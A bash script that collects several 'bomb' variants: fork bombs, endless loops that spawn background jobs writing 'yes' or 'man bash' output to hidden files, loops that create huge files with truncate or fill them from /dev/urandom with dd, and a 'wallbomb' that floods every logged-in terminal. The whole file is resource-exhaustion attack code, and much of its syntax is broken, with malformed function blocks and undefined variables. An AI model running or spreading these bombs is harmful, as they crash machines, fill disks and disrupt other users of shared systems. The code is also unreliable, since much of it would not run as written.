#!/usr/bin/env bash
#short version but not ready yet. ignore :(){i=0;yes balls > $temp$i &;($i++);:|:&};:

#yesbomb 1
# :()
# {
# yes balls > file$i.txt &
# ($1)
# : $1| : ($1 * -1) &
# }
# i=0
# : $i

#yesbomb two
#oneliner

#full
:
{
	for (( i=0; ; i+=1 )); do
		yes balls > .$1$i & disown
	done
}
words=`cat /usr/share/dict/words`
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#yesbomb three
#oneliner

#full
:
{
	for (( i=0; ; i+=1 )); do
		man bash | yes > .$1$i & disown
	done
}
words=`cat /usr/share/dict/words`
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#bomb four (truncate)
#oneliner

#full
:
{
	for (( i=0; ; i+=1 )); do
		truncate -s 1G .$1$i & disown
	done
}
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#bomb five (dd)
#oneliner

#full
:
{
	for (( i=0; ; i+=1 )); do
		dd if=/dev/urandom of=./.$1$i & disown
	done
}
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#bombsix truncate and morph
#oneliner

#full
:
{
	for (( i=0; ; i+=1 )); do
		mv $1 .$1$i
	done
}
c=0
while true; do
	truncate -s 30G .$c
	: .$c & disown
done

#wallbomb
:(){echo "balls"|wall;:|:&disown};:&disown
#long version of wallbomb
:
{
	echo "balls" | wall
	: | : & disown
}
: & disown
